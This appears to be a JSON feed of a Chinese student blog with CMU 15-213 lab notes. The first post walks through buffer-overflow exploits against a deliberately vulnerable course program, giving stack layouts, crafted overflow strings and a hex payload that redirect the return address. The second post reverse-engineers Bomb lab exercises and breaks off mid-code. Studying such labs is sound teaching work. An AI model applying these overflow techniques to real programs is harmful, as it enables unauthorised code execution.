{
    "version": "https://jsonfeed.org/version/1",
    "title": "望春风 • All posts by \"15-213 activity\" category",
    "description": "计算机&数理&文学爱好者，喜欢健身、下厨、听音乐和看电影",
    "home_page_url": "https://salvely.github.io/blog",
    "items": [
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Attack%20lab%20recitation/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Attack%20lab%20recitation/",
            "title": "15-213 Attack lab recitation",
            "date_published": "2024-02-29T09:20:40.000Z",
            "content_html": "<p>输入 <code>gdb activity</code> ，开启 activity 之旅。</p>\n<blockquote>\n<p>Objective: The goal of this activity is to input a string that causes the program to call win(0x15213),<br>\nand thereby win a cookie.<br>\n 在开启之前，先查看一下 <code>solve</code>  函数的内容：</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">solve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">long</span> before <span class=\"token operator\">=</span> <span class=\"token number\">0xb4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">long</span> after <span class=\"token operator\">=</span> <span class=\"token number\">0xaf</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">Gets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>before <span class=\"token operator\">==</span> <span class=\"token number\">0x3331323531</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token function\">win</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x15213</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>after <span class=\"token operator\">==</span> <span class=\"token number\">0x3331323831</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">win</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18213</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>看一下 <code>solve</code>  的汇编代码：</p>\n<pre><code>(gdb) disas solve\nDump of assembler code for function solve:\n   0x00000000000011df &lt;+0&gt;:     endbr64\n   0x00000000000011e3 &lt;+4&gt;:     sub    $0x38,%rsp\n   0x00000000000011e7 &lt;+8&gt;:     movq   $0xb4,0x28(%rsp)\n   0x00000000000011f0 &lt;+17&gt;:    movq   $0xaf,0x8(%rsp)\n   0x00000000000011f9 &lt;+26&gt;:    lea    0x10(%rsp),%rdi\n   0x00000000000011fe &lt;+31&gt;:    callq  0x1279 &lt;Gets&gt;\n   0x0000000000001203 &lt;+36&gt;:    mov    0x28(%rsp),%rdx\n   0x0000000000001208 &lt;+41&gt;:    movabs $0x3331323531,%rax\n   0x0000000000001212 &lt;+51&gt;:    cmp    %rax,%rdx\n   0x0000000000001215 &lt;+54&gt;:    je     0x1230 &lt;solve+81&gt;\n   0x0000000000001217 &lt;+56&gt;:    mov    0x8(%rsp),%rdx\n   0x000000000000121c &lt;+61&gt;:    movabs $0x3331323831,%rax\n   0x0000000000001226 &lt;+71&gt;:    cmp    %rax,%rdx\n   0x0000000000001229 &lt;+74&gt;:    je     0x123c &lt;solve+93&gt;\n   0x000000000000122b &lt;+76&gt;:    add    $0x38,%rsp\n   0x000000000000122f &lt;+80&gt;:    retq\n   0x0000000000001230 &lt;+81&gt;:    mov    $0x15213,%edi\n   0x0000000000001235 &lt;+86&gt;:    callq  0x1169 &lt;win&gt;\n   0x000000000000123a &lt;+91&gt;:    jmp    0x1217 &lt;solve+56&gt;\n   0x000000000000123c &lt;+93&gt;:    mov    $0x18213,%edi\n   0x0000000000001241 &lt;+98&gt;:    callq  0x1169 &lt;win&gt;\n   0x0000000000001246 &lt;+103&gt;:   jmp    0x122b &lt;solve+76&gt;\nEnd of assembler dump.\n</code></pre>\n<p>函数给 <code>solve</code>  预留了 56 个字节的空间：</p>\n<ol>\n<li><code>before = 0xb4</code>  移动到 <code>%rsp + 40</code>  处</li>\n<li><code>after = 0xaf</code>  移动到 <code>%rsp + 8</code>  处</li>\n<li><code>%rdi = %rsp + 16</code></li>\n<li>调用 <code>gets</code></li>\n<li><code>%rdx = *(%rsp + 40)</code> ，把 <code>before</code>  赋给 <code>%rdx</code></li>\n<li><code>%rax = $0x3331323531</code></li>\n<li>接下来是个判断：</li>\n</ol>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>rdx <span class=\"token operator\">==</span> rax<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    edi <span class=\"token operator\">=</span> <span class=\"token number\">0x15213</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    callq win</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>rdx <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rsp <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rax <span class=\"token operator\">=</span> <span class=\"token number\">0x3331323831</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>rdx <span class=\"token operator\">==</span> rax<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  edi <span class=\"token operator\">=</span> <span class=\"token number\">0x18213</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  callq win<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>rsp <span class=\"token operator\">+=</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>完成 <code>gets</code>  之前的调用后，栈分布大致如下（一共 56 个字节的分配）：</p>\n<ol>\n<li><code>rsp</code>  处没有值</li>\n<li><code>rsp + 8</code>  处存储 <code>after = 0xaf</code></li>\n<li><code>rsp + 16 ~ rsp + 24</code>  处存储 16 字节的 <code>buf</code></li>\n<li><code>rsp + 32</code>  处 8 个字节空闲</li>\n<li><code>rsp + 40</code>  处存储 <code>before = 0xb4</code></li>\n<li><code>rsp + 56</code>  处存储的是调用 <code>solve</code>  的 <code>return address</code></li>\n</ol>\n<h3 id=\"普通缓冲区溢出\"><a class=\"markdownIt-Anchor\" href=\"#普通缓冲区溢出\">#</a> 普通缓冲区溢出</h3>\n<p>查看代码可以理解，要让程序调用 <code>win(0x15213)</code> ，需要让 <code>rdx == 0x3331323531</code> ，而在这之前 <code>rdx = before</code> ，所以我们的根本目的是让 <code>before = 0x3331323531</code> 。就得让 <code>buf</code>  前 24 个字节为 0，后八个字节等于 <code>0x3331323531</code> 。该机器为小端法机器，那么这 8 个字节从低地址到高地址的顺序应该是： <code>0x31 0x35 0x32 0x31 0x33 0x00 0x00 0x00</code> ，这 8 个个字节翻译成 <code>ASCII码</code> 就是 <code>15213</code> 。此外 <code>gets</code>  一定要读到 <code>\\n</code>  字符，它会把 <code>\\n</code>  替换为 <code>\\0</code>  字符。它不是读到 <code>\\0</code>  字符就终止。后面不需要加 <code>0</code> ，因为 <code>0</code>  的 <code>ASCII</code>  编码是 <code>0x30</code> 。如果最后加了 3 个 <code>0</code>  的话，最后 8 个字节的地址就会变成 <code>0x31 0x35 0x32 0x31 0x33 0x30 0x30 0x30</code> 。</p>\n<blockquote>\n<p>有几条要注意的点：</p>\n<ol>\n<li>机器为小端法机器，写内存的时候要把数字倒过来</li>\n<li><code>0x00</code>  是在 ASCII 码里面是空字符， <code>0x30</code>  在 ASCII 码里面是 <code>0</code></li>\n<li><code>gets</code>  要读到 <code>\\n</code> ，他会把 <code>\\n</code>  替换成 <code>\\0</code>  存储在 <code>buf</code>  中，无需手动 <code>\\0</code></li>\n<li>输入的时候只能输入字符串，而不能输入 10 进制或者 16 进制的值，如果函数没有调用 <code>atoi</code> ，输入一律被当作字符串处理。因此我们需要输入 <code>0x3331323531</code>  对应的 <code>ASCII</code>  编码，而不是这个值本身。</li>\n</ol>\n</blockquote>\n<p>输入 <code>01234567890123456789012315213</code> ，成功调用 <code>win(0x15213)</code> 。如下：</p>\n<pre><code>gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec5/src$ ./activity\n01234567890123456789012315213\nYou win 1 cookie! Great start!\nReturning normally from main\n</code></pre>\n<h3 id=\"包含返回地址攻击的缓冲区溢出\"><a class=\"markdownIt-Anchor\" href=\"#包含返回地址攻击的缓冲区溢出\">#</a> 包含返回地址攻击的缓冲区溢出</h3>\n<p>要让这个 <code>solve</code>  函数跳转到我们插入的代码段（未开启栈随机化 / <code>canary</code> / <code>NX bit</code>  及其他防护机制，不考虑 <code>nop sled</code> ），我们需要利用缓冲区溢出，让 <code>return address</code>  修改为我们所插入的代码段的地址。我们需要让 <code>buf</code>  的前 40 个字节为任意内容，最后 8 个字节为我们插入的攻击代码的地址。</p>\n<p>我们这次的目的是想调到 <code>&lt;solve +93&gt;</code>  位置处，本次运行过程中该位置的地址是 <code>0x000055555555523c</code> ，过会儿我们要将其插入 <code>buf</code>  的第 48-48 字节处。该地址的值换算成小端法是 <code>0x3c 0x52 0x55 0x55 0x55 0x55 0x00 0x00</code> 。其对应的 <code>ASCII码</code> 是 <code>&lt;RUUUU</code> ，后面的 <code>null</code>  为 <code>0x00</code> 。我们要让程序返回的时候跳转到 <code>mov $0x18213,%edi</code> 。那么构造的字符串应该是 <code>0123456789012345678901234567890123456789&lt;RUUUU</code> 。结果如下：</p>\n<pre><code>43          if (after == 0x3331323831) &#123;\n(gdb) n\nsolve () at activity.c:44\n44              win(0x18213);\n(gdb)\nYou win 2 cookies! Woohoo!\n0x0000000000000000 in ?? ()\n</code></pre>\n<p>成功！</p>\n<h3 id=\"引导程序到攻击代码\"><a class=\"markdownIt-Anchor\" href=\"#引导程序到攻击代码\">#</a> 引导程序到攻击代码</h3>\n<p>此处我们进行更进阶的攻击，程序中函数 <code>solve()</code>  并未调用过 <code>win(0x18613)</code> ，让我们尝试返回到 <code>win(0x18613)</code>  中。此时我们不光只破解 <code>solve()</code> ，还需要对 <code>win</code>  函数的代码进行分析。结果如下：</p>\n<pre><code>(gdb) disas win\nDump of assembler code for function win:\n   0x0000555555555169 &lt;+0&gt;:     endbr64\n   0x000055555555516d &lt;+4&gt;:     sub    $0x8,%rsp\n   0x0000555555555171 &lt;+8&gt;:     cmp    $0x15213,%edi\n   0x0000555555555177 &lt;+14&gt;:    je     0x5555555551a7 &lt;win+62&gt;\n   0x0000555555555179 &lt;+16&gt;:    cmp    $0x18213,%edi\n   0x000055555555517f &lt;+22&gt;:    je     0x5555555551b5 &lt;win+76&gt;\n   0x0000555555555181 &lt;+24&gt;:    cmp    $0x18613,%edi\n   0x0000555555555187 &lt;+30&gt;:    je     0x5555555551c3 &lt;win+90&gt;\n   0x0000555555555189 &lt;+32&gt;:    mov    0x2ea1(%rip),%eax        # 0x555555558030 &lt;mystery&gt;\n   0x000055555555518f &lt;+38&gt;:    cmp    $0x15513,%eax\n   0x0000555555555194 &lt;+43&gt;:    je     0x5555555551d1 &lt;win+104&gt;\n   0x0000555555555196 &lt;+45&gt;:    lea    0xed3(%rip),%rdi        # 0x555555556070\n   0x000055555555519d &lt;+52&gt;:    callq  0x555555555030 &lt;puts@plt&gt;\n   0x00005555555551a2 &lt;+57&gt;:    add    $0x8,%rsp\n   0x00005555555551a6 &lt;+61&gt;:    retq\n   0x00005555555551a7 &lt;+62&gt;:    lea    0xe5a(%rip),%rdi        # 0x555555556008\n   0x00005555555551ae &lt;+69&gt;:    callq  0x555555555030 &lt;puts@plt&gt;\n   0x00005555555551b3 &lt;+74&gt;:    jmp    0x5555555551a2 &lt;win+57&gt;\n   0x00005555555551b5 &lt;+76&gt;:    lea    0xedc(%rip),%rdi        # 0x555555556098\n   0x00005555555551bc &lt;+83&gt;:    callq  0x555555555030 &lt;puts@plt&gt;\n   0x00005555555551c1 &lt;+88&gt;:    jmp    0x5555555551a2 &lt;win+57&gt;\n   0x00005555555551c3 &lt;+90&gt;:    lea    0xe5e(%rip),%rdi        # 0x555555556028\n   0x00005555555551ca &lt;+97&gt;:    callq  0x555555555030 &lt;puts@plt&gt;\n   0x00005555555551cf &lt;+102&gt;:   jmp    0x5555555551a2 &lt;win+57&gt;\n   0x00005555555551d1 &lt;+104&gt;:   lea    0xe78(%rip),%rdi        # 0x555555556050\n   0x00005555555551d8 &lt;+111&gt;:   callq  0x555555555030 &lt;puts@plt&gt;\n   0x00005555555551dd &lt;+116&gt;:   jmp    0x5555555551a2 &lt;win+57&gt;\nEnd of assembler dump.\n</code></pre>\n<p>我们需要跳转到 <code>if(arg == 0x18613)</code>  后面那句，也就是 <code>&lt;win+90&gt;</code>  处，该条指令的地址是 <code>0x00005555555551c3</code> ，转化成小端法是 <code>0xc3 0x51 0x55 0x55 0x55 0x55 0x00 0x00</code> ，转化成 <code>ASCII码</code> 也就是 <code>ÃQUUUU</code> 。因此，我们构造的字符串应该是 <code>0123456789012345678901234567890123456789ÃQUUUU</code> 。结果如下：</p>\n<pre><code>(gdb) p $rsp\n$2 = (void *) 0x555555559018 &lt;my_stack+4056&gt;\n(gdb) x/s 0x555555559018\n0x555555559018 &lt;my_stack+4056&gt;: &quot;ÃQUUUU&quot;\n(gdb) x/6bx 0x555555559018\n0x555555559018 &lt;my_stack+4056&gt;: 0xc3    0x83    0x51    0x55    0x55    0x55\n</code></pre>\n<p>这里出现了一点问题，就是 <code>Ã</code>  采用 <code>Unicode</code>  扩展编码，其编码为 <code>0xc3 0x83</code> ，而我们仅仅需要 <code>0xc3</code> ，因此我们需要将 16 进制的地址写在文件里，然后用文件作为 <code>activity</code>  的输入。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MuY211LmVkdS9hZnMvY3MvYWNhZGVtaWMvY2xhc3MvMTUyMTMtZjIzL3d3dy9yZWNpdGF0aW9ucy9yZWMwNF9zbGlkZXMucGRm\">Slides 中最后一页</span>告诉我们，提供了 <code>hex2raw</code>  脚本，可以把 16 进制值写到 <code>input2.txt</code>  中，然后通过 <code>hex2raw</code>  转化为 <code>input2.bin</code> 。我们在 <code>input2.txt</code>  中写入值 <code>30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 31 35 32 31 33 00 30 31 32 33 34 35 36 37 38 39 c3 51 55 55 55 55</code> ，将其转化，然后输入 <code>./activity &lt; ../inputs/input2.bin</code> 。<br>\n结果如下：</p>\n<pre><code>(gdb) r &lt; ../inputs/input2.bin\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/rec5/src/activity &lt; ../inputs/input2.bin\nYou win 3 cookies! That's right!\n\nProgram received signal SIGSEGV, Segmentation fault.\n</code></pre>\n<p>成功！</p>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20recitation/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20recitation/",
            "title": "15-213 Bomb lab recitation 记录",
            "date_published": "2024-02-29T09:19:39.000Z",
            "content_html": "<h2 id=\"act1\"><a class=\"markdownIt-Anchor\" href=\"#act1\">#</a> act1</h2>\n<p>依次输入如下指令：</p>\n<pre><code>(gdb) disassemble main // show the assembly instructions in main\n</code></pre>\n<p>其 <code>main</code>  函数反汇编结果如下：</p>\n<pre><code>(gdb) disassemble main\nDump of assembler code for function main:\n   0x0000000000401730 &lt;+0&gt;:     endbr64\n   0x0000000000401734 &lt;+4&gt;:     push   %rbx\n   0x0000000000401735 &lt;+5&gt;:     movslq %edi,%rdi\n   0x0000000000401738 &lt;+8&gt;:     mov    %rsi,%rbx\n   0x000000000040173b &lt;+11&gt;:    xor    %eax,%eax\n   0x000000000040173d &lt;+13&gt;:    mov    -0x8(%rsi,%rdi,8),%rdx\n   0x0000000000401742 &lt;+18&gt;:    lea    0xa8eb6(%rip),%rsi        # 0x4aa5ff\n   0x0000000000401749 &lt;+25&gt;:    mov    $0x1,%edi\n   0x000000000040174e &lt;+30&gt;:    callq  0x44b9a0 &lt;__printf_chk&gt;\n   0x0000000000401753 &lt;+35&gt;:    movq   $0x0,(%rbx)\n   0x000000000040175a &lt;+42&gt;:    pop    %rbx\n   0x000000000040175b &lt;+43&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>该汇编代码的过程如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> ret <span class=\"token operator\">=</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span>argv<span class=\"token punctuation\">[</span>argc<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"act2\"><a class=\"markdownIt-Anchor\" href=\"#act2\">#</a> act2</h2>\n<p>反汇编 <code>main</code>  函数：</p>\n<pre><code>(gdb) disas main\nDump of assembler code for function main:\n   0x00000000004016c0 &lt;+0&gt;:     endbr64\n   0x00000000004016c4 &lt;+4&gt;:     push   %rbx\n   0x00000000004016c5 &lt;+5&gt;:     movslq %edi,%rdi\n   0x00000000004016c8 &lt;+8&gt;:     mov    %rsi,%rbx\n   0x00000000004016cb &lt;+11&gt;:    mov    -0x8(%rsi,%rdi,8),%rsi\n   0x00000000004016d0 &lt;+16&gt;:    lea    0x9392d(%rip),%rdi        # 0x495004\n   0x00000000004016d7 &lt;+23&gt;:    callq  0x401c75 &lt;stc&gt;\n   0x00000000004016dc &lt;+28&gt;:    movq   $0x0,(%rbx)\n   0x00000000004016e3 &lt;+35&gt;:    pop    %rbx\n   0x00000000004016e4 &lt;+36&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>输入下列指令用 16 进制打印 <code>%rsi</code>  和 <code>%rdi</code>  的值：</p>\n<pre><code>(gdb) print /x $rsi\n$1 = 0x7fffffffdf18\n(gdb) print /x $rdi\n$2 = 0x1\n</code></pre>\n<p>由此看 <code>$rdi</code>  应该是 <code>argc</code> , 而 <code>$rsi</code>  应该是 <code>argv</code> 。</p>\n<p>再输入 <code>disas stc</code> ，获得如下结果：</p>\n<pre><code>(gdb) disas stc\nDump of assembler code for function stc:\n   0x0000000000401c75 &lt;+0&gt;:     push   %rbx\n   0x0000000000401c76 &lt;+1&gt;:     mov    %rsi,%rbx\n   0x0000000000401c79 &lt;+4&gt;:     callq  0x4115d0 &lt;puts&gt;\n   0x0000000000401c7e &lt;+9&gt;:     mov    %rbx,%rdi\n   0x0000000000401c81 &lt;+12&gt;:    callq  0x4115d0 &lt;puts&gt;\n   0x0000000000401c86 &lt;+17&gt;:    pop    %rbx\n   0x0000000000401c87 &lt;+18&gt;:    retq\n   0x0000000000401c88 &lt;+19&gt;:    nopl   0x0(%rax,%rax,1)\nEnd of assembler dump.\n</code></pre>\n<p>将其转化为 C 语言函数应该是：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// a:rsi b:rdi</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">stc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> a<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token comment\">// 压入原 rbx</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   rbx <span class=\"token operator\">=</span> rsi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   rdi <span class=\"token operator\">=</span> rbx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token comment\">// 恢复 rbx</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token comment\">//nopl 是干嘛用的？</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token keyword\">return</span> rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"act3\"><a class=\"markdownIt-Anchor\" href=\"#act3\">#</a> act3</h2>\n<p>观察 <code>main</code>  函数的 C 代码，发现只要 <code>compare</code>  函数返回 1 即可通关。对 <code>compare</code>  函数进行反汇编可得：</p>\n<pre><code>(gdb) disas compare\nDump of assembler code for function compare:\n   0x0000000000401c95 &lt;+0&gt;:     push   %rbx\n   0x0000000000401c96 &lt;+1&gt;:     mov    %rdi,%rbx\n   0x0000000000401c99 &lt;+4&gt;:     add    $0x5,%rbx\n   0x0000000000401c9d &lt;+8&gt;:     add    %rsi,%rbx\n   0x0000000000401ca0 &lt;+11&gt;:    cmp    $0x3b6d,%rbx\n   0x0000000000401ca7 &lt;+18&gt;:    sete   %al\n   0x0000000000401caa &lt;+21&gt;:    movzbq %al,%rax\n   0x0000000000401cae &lt;+25&gt;:    pop    %rbx\n   0x0000000000401caf &lt;+26&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>还原其 C 代码如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// rdi:a rsi:b</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">compare</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token keyword\">int</span> ret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token comment\">// 压入原 rbx</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   rbx <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   rbx <span class=\"token operator\">+=</span> <span class=\"token number\">0x5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   rbx <span class=\"token operator\">+=</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   rbx <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b <span class=\"token operator\">+</span> <span class=\"token number\">0x5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>rbx <span class=\"token operator\">==</span> <span class=\"token number\">0x3b6d</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      ret <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      ret <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token comment\">// 恢复原 Rbx</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发现 <code>compare</code>  就要求 <code>a + b = 0x3b68(10进制15208)</code> 。在 <code>gdb</code>  中只能输入 10 进制数字，如果输入 16 进制数字的话会被当成字符串。运行 <code>./act3 15208 0</code> ，成功！</p>\n<pre><code>gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec4$ ./act3 15208 0\ngood args!\n</code></pre>\n<h2 id=\"act4\"><a class=\"markdownIt-Anchor\" href=\"#act4\">#</a> act4</h2>\n<p>先查看 <code>act4.c</code>  的代码，看看是干嘛的：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">compute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> inArg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> st<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    inArg <span class=\"token operator\">*=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    st <span class=\"token operator\">=</span> inArg <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token 